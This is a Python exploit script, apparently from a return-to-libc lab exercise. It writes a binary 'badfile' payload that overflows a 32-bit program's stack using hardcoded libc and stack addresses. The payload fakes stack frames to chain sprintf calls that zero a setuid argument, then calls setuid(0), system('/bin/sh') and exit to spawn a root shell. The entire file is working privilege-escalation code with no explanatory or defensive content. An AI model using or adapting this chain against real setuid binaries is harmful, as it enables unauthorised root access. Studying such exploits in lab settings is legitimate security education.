
def p32(value):
    return (value).to_bytes(4, 'little')

fsp_addr = 0xf7e3bcc0
sys_addr = 0xf7e27e10
ext_addr = 0xf7e1b060
uid_addr = 0xf7ea9bb0
pop_addr = 0x5655568a
ebp_addr = 0xffffccc8

frames = 0x20
payload = 0x18 * b'A'

# address of "/bin/sh"
str_addr = ebp_addr + frames * 6 + 8

# address of setuid argv
fsp_arg1 = ebp_addr + frames * 4 + 12
fsp_arg2 = ebp_addr + frames * 6 + 8 + len(b'/bin/sh')


ebp_next = ebp_addr

# sprintf(dest, source)
for i in range(4):
    ebp_next += frames
    payload += p32(ebp_next)
    payload += p32(fsp_addr)
    payload += p32(pop_addr)
    payload += p32(fsp_arg1)
    payload += p32(fsp_arg2)
    payload += (frames - 4 * 5) * b'A'
    fsp_arg1 += 1

# setuid(0)
ebp_next += frames
payload += p32(ebp_next)
payload += p32(uid_addr)
payload += p32(pop_addr)
payload += p32(0xFFFFFFFF)
payload += (frames - 4 * 4) * b'A'

# system("/bin/sh")
ebp_next += frames
payload += p32(ebp_next)
payload += p32(sys_addr)
payload += p32(pop_addr)
payload += p32(str_addr)
payload += (frames - 4 * 4) * b'A'

# exit()
payload += p32(0xFFFFFFFF)
payload += p32(ext_addr)
payload += b'/bin/sh\0'


with open('badfile', 'wb') as f:
    f.write(payload)
    f.close()
    print('[+] Voila!')